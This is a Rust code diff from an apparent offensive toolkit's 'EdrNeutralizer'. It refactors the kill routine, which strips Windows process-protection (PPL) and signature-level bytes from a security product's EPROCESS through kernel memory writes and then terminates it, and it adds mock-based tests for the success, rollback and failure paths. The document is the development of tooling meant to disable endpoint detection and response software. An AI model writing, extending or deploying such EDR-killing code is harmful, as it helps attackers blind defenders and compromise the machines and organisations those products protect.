@@ -84,7 +84,7 @@ pub fn is_plausible_phys_address(pa: u64) -> bool {
 /// or kernel (`0xFFFF_8000_0000_0000`–`0xFFFF_FFFF_FFFF_FFFF`); everything
 /// between is non-canonical. Feeding a physical address (typically < 2^46) or
 /// a user VA into a VA-based `KernelRw` fails this check cheaply. Used by
-/// `win::va_rw::VaKernelRw` (Windows-only).
+/// `pagewalk::VaKernelRw` (re-exported as `win::va_rw::VaKernelRw`).
 pub fn is_plausible_kernel_va(va: u64) -> bool {
     va >= 0xFFFF_8000_0000_0000
 }
@@ -1261,9 +1261,23 @@ impl EdrNeutralizer {
     ///
     /// Returns the (now-dying) target's `EPROCESS` KVA for operator logging.
     pub fn kill(&self, krw: &dyn KernelRw, pid: u32) -> Result<usize, KitError> {
+        self.kill_with(krw, pid, terminate_process_user_mode)
+    }
+
+    /// `kill` with the terminate step injected. The production path passes
+    /// [`terminate_process_user_mode`]; host tests inject a stub so the
+    /// success / terminate-failure / rollback-failure paths are exercisable
+    /// without a live Windows target. Never callable from outside netsec.rs —
+    /// the injection seam is test-only.
+    fn kill_with(
+        &self,
+        krw: &dyn KernelRw,
+        pid: u32,
+        terminate: impl FnOnce(u32) -> Result<(), KitError>,
+    ) -> Result<usize, KitError> {
         let eprocess_kva = self.resolve_target_eprocess(krw, pid)?;
         let snapshot = ProtectionSnapshot::strip(krw, eprocess_kva, &self.offsets)?;
-        match terminate_process_user_mode(pid) {
+        match terminate(pid) {
             Ok(()) => Ok(eprocess_kva),
             Err(term_err) => match snapshot.restore(krw, eprocess_kva, &self.offsets) {
                 // Rollback OK: surface the terminate failure.
@@ -1888,6 +1902,156 @@ mod tests {
         assert!(matches!(
             kit.kill(&krw, 100),
             Err(KitError::UnsupportedPosture(_))
+        ));
+    }
+
+    /// EPROCESS KVAs in canonical kernel space + the three protection offsets
+    /// as locals (the offsets struct moves into the kit).
+    macro_rules! kill_fixture {
+        ($krw:ident) => {{
+            let offsets = test_offsets();
+            let head = 0xFFFF_8000_0000_1000usize;
+            let e1 = 0xFFFF_8000_0000_5000usize;
+            let e2 = 0xFFFF_8000_0000_6000usize;
+            setup_process_list_at(&$krw, &offsets, head, e1, e2);
+            let (prot, sig, ssig) = (
+                offsets.protection,
+                offsets.signature_level,
+                offsets.section_signature_level,
+            );
+            // Pretend the target is PPL-protected (0x61 = Protected|WinTcb).
+            $krw.kwrite(e1 + prot, &[0x61]).unwrap();
+            $krw.kwrite(e1 + sig, &[0x08]).unwrap();
+            $krw.kwrite(e1 + ssig, &[0x08]).unwrap();
+            let kit = EdrNeutralizer {
+                ps_active_process_head_kva: head,
+                offsets,
+            };
+            (kit, e1, [prot, sig, ssig])
+        }};
+    }
+
+    #[test]
+    fn edr_neutralizer_kill_success_leaves_strip_in_place() {
+        // Injected terminator succeeds → kill returns the EPROCESS KVA and the
+        // zeroed protection bytes stay zeroed (the EPROCESS is being torn
+        // down by the kernel, so the strip is intentionally not rolled back).
+        let krw = MockKrw::new();
+        let (kit, e1, prot_offsets) = kill_fixture!(krw);
+        assert_eq!(kit.kill_with(&krw, 100, |_| Ok(())).unwrap(), e1);
+        let mut b = [0xFFu8];
+        for off in prot_offsets {
+            krw.kread(e1 + off, &mut b).unwrap();
+            assert_eq!(b[0], 0, "successful kill leaves the PPL strip in place");
+        }
+    }
+
+    #[test]
+    fn edr_neutralizer_kill_terminate_failure_rolls_back() {
+        // Injected terminator fails → the terminate error (not a rollback
+        // error) is surfaced and every protection byte is restored.
+        let krw = MockKrw::new();
+        let (kit, e1, prot_offsets) = kill_fixture!(krw);
+        let expected = [0x61u8, 0x08, 0x08];
+        let err = kit
+            .kill_with(&krw, 100, |_| {
+                Err(KitError::Other("injected terminate failure".into()))
+            })
+            .unwrap_err();
+        assert!(
+            matches!(&err, KitError::Other(m) if m.contains("injected terminate failure")),
+            "terminate error must propagate, got {err:?}"
+        );
+        let mut b = [0u8; 1];
+        for (off, want) in prot_offsets.iter().zip(expected.iter()) {
+            krw.kread(e1 + off, &mut b).unwrap();
+            assert_eq!(&b[0], want, "failed kill must roll back the PPL strip");
+        }
+    }
+
+    /// MockKrw wrapper whose writes of non-zero bytes fail. The PPL strip
+    /// writes zeros (succeeds); the rollback writes the saved non-zero bytes
+    /// (fails) — exercising kill's worst-case double-failure path.
+    struct RestoreFailKrw(MockKrw);
+    impl KernelRw for RestoreFailKrw {
+        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
+            self.0.kread(kaddr, dst)
+        }
+        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
+            if src.iter().any(|&b| b != 0) {
+                return Err(KrwError::Unavailable("write blocked by mock"));
+            }
+            self.0.kwrite(kaddr, src)
+        }
+    }
+
+    #[test]
+    fn edr_neutralizer_kill_rollback_failure_reports_living_unprotected_target() {
+        // Terminate fails AND rollback fails → kill must say so explicitly
+        // (target left ALIVE with PPL stripped), never a false success.
+        let inner = MockKrw::new();
+        let offsets = test_offsets();
+        let head = 0xFFFF_8000_0000_1000usize;
+        let e1 = 0xFFFF_8000_0000_5000usize;
+        let e2 = 0xFFFF_8000_0000_6000usize;
+        setup_process_list_at(&inner, &offsets, head, e1, e2);
+        inner.kwrite(e1 + offsets.protection, &[0x61]).unwrap();
+        let krw = RestoreFailKrw(inner);
+        let kit = EdrNeutralizer {
+            ps_active_process_head_kva: head,
+            offsets,
+        };
+        let err = kit
+            .kill_with(&krw, 100, |_| {
+                Err(KitError::Other("injected terminate failure".into()))
+            })
+            .unwrap_err();
+        assert!(
+            matches!(&err, KitError::Other(m) if m.contains("ALIVE with PPL stripped")),
+            "double failure must be reported honestly, got {err:?}"
+        );
+    }
+
+    #[test]
+    fn edr_neutralizer_kill_refuses_noncanonical_eprocess_kva() {
+        // Out-of-bounds guard: a corrupt find_eprocess result (a user-space
+        // address) must be refused by ProtectionSnapshot::strip BEFORE any
+        // write, and the bytes at the bogus address stay untouched.
+        let krw = MockKrw::new();
+        let offsets = test_offsets();
+        // head/e1/e2 at 0x1000/0x5000/0x6000 — non-canonical, user space.
+        setup_process_list(&krw, &offsets);
+        krw.kwrite(0x5000 + offsets.protection, &[0x61]).unwrap();
+        let kit = EdrNeutralizer {
+            ps_active_process_head_kva: 0x1000,
+            offsets,
+        };
+        assert!(matches!(
+            kit.kill_with(&krw, 100, |_| Ok(())),
+            Err(KitError::UnsupportedPosture(_))
+        ));
+        let mut b = [0u8; 1];
+        krw.kread(0x5000 + offsets.protection, &mut b).unwrap();
+        assert_eq!(
+            b[0], 0x61,
+            "refused strip must not write to the bogus address"
+        );
+    }
+
+    #[test]
+    fn edr_neutralize_trait_kill_kva_delegates_to_kill() {
+        // kill_kva must reach the real resolve walk (NotFound for an unknown
+        // PID), not the trait default's "no kernel-r/w Kill tier" stub.
+        let krw = MockKrw::new();
+        let offsets = test_offsets();
+        setup_process_list(&krw, &offsets);
+        let kit = EdrNeutralizer {
+            ps_active_process_head_kva: 0x1000,
+            offsets,
+        };
+        assert!(matches!(
+            EdrNeutralizeKit::kill_kva(&kit, &krw, 999),
+            Err(KitError::NotFound)
         ));
     }
 
